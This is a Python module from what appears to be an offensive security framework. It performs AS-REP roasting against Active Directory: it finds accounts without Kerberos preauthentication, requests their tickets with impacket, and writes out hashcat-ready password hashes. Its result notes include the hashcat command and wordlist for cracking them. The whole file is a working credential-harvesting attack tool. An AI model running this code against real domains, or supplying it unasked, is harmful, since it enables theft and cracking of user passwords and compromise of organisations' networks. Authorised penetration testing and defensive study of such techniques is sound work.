"""Request AS-REP for accounts without preauth -- no credentials needed."""

from __future__ import annotations

import binascii
from pathlib import Path
from typing import List

from sovereign.models import AttackResult, EngagementContext
from sovereign.logger import log
from sovereign.modules.base import BaseModule
from sovereign.utils.ldap_helpers import ldap_connect, ldap_search
from sovereign.data import LDAP_USERS_NO_PREAUTH, HC_ASREPROAST

try:
    from impacket.krb5.types import Principal
    from impacket.krb5 import constants as krb5const
    from impacket.krb5.kerberosv5 import getKerberosTGT
    from impacket.krb5.asn1 import AS_REP
    IMPACKET = True
except ImportError:
    IMPACKET = False


class ASREPRoastModule(BaseModule):
    """Request AS-REP for accounts without preauth -- no credentials needed."""

    name = "asreproast"

    def run(self, ctx: EngagementContext, **kwargs: object) -> List[AttackResult]:
        output_file: str = str(kwargs.get("output_file", ""))
        results: List[AttackResult] = []

        # Get accounts from loot or enumerate via LDAP (requires creds for LDAP)
        asrep_accounts = ctx.loot.get("asrep_accounts", [])
        if not asrep_accounts and (ctx.password or ctx.nt_hash):
            if not ctx.ldap_conn and not ldap_connect(ctx):
                return [AttackResult("asreproast", "ldap", "PARTIAL",
                                     notes="Cannot enumerate via LDAP. Provide usernames via --users")]
            entries = ldap_search(ctx, LDAP_USERS_NO_PREAUTH, ["sAMAccountName"])
            asrep_accounts = [str(getattr(e, "sAMAccountName", "")) for e in entries]

        if not asrep_accounts:
            return [AttackResult("asreproast", "scan", "INFO",
                                 notes="No accounts without preauth found (or need creds to enumerate)")]

        if not IMPACKET:
            return [AttackResult("asreproast", "setup", "FAILED",
                                 notes="Install impacket: pip install impacket")]

        log(f"[ASREPRoast] Targeting {len(asrep_accounts)} accounts...", "INFO")
        hashes: List[str] = []

        for username in asrep_accounts:
            try:
                user_p = Principal(
                    username,
                    type=krb5const.PrincipalNameType.NT_PRINCIPAL.value
                )
                # Request TGT without password -- works only if preauth disabled
                tgt, cipher, _, _ = getKerberosTGT(
                    user_p, "", ctx.domain, b"", b"", b"", ctx.dc_ip
                )
                from pyasn1.codec.native import decoder as nd
                decoded = nd.decode(tgt, asn1Spec=AS_REP())[0]
                etype  = int(decoded["enc-part"]["etype"])
                cipher_bytes = decoded["enc-part"]["cipher"].asOctets()
                hash_str = (
                    f"$krb5asrep${etype}${username}@{ctx.domain.upper()}:"
                    f"{binascii.hexlify(cipher_bytes[:16]).decode()}"
                    f"${binascii.hexlify(cipher_bytes[16:]).decode()}"
                )
                hashes.append(hash_str)
                log(f"[ASREPRoast] Hash captured: {username}", "CRIT")
                results.append(AttackResult(
                    "asreproast", "asrep_capture", "SUCCESS",
                    target=username, severity="CRITICAL",
                    data={"username": username, "etype": etype,
                          "hash": hash_str[:80] + "..."},
                    notes=f"AS-REP hash for {username}. Crack with: hashcat -m {HC_ASREPROAST} hash.txt rockyou.txt",
                ))
            except Exception as exc:
                err = str(exc)
                if "KDC_ERR_PREAUTH_REQUIRED" in err:
                    log(f"[ASREPRoast] {username}: preauth required (false positive)", "WARN")
                else:
                    log(f"[ASREPRoast] {username}: {err}", "WARN")
                results.append(AttackResult("asreproast", "asrep_request", "FAILED",
                                            target=username, notes=err))

        if hashes:
            out = output_file or "asrep_hashes.txt"
            Path(out).write_text("\n".join(hashes) + "\n", encoding="utf-8")
            log(f"[ASREPRoast] {len(hashes)} hashes saved → {out}", "OK")
            ctx.loot["asrep_hashes"] = hashes
            results.append(AttackResult(
                "asreproast", "summary", "SUCCESS",
                severity="CRITICAL",
                data={"count": len(hashes), "file": out},
                notes=f"{len(hashes)} AS-REP hashes saved. hashcat -m 18200 {out} rockyou.txt",
            ))
        return results
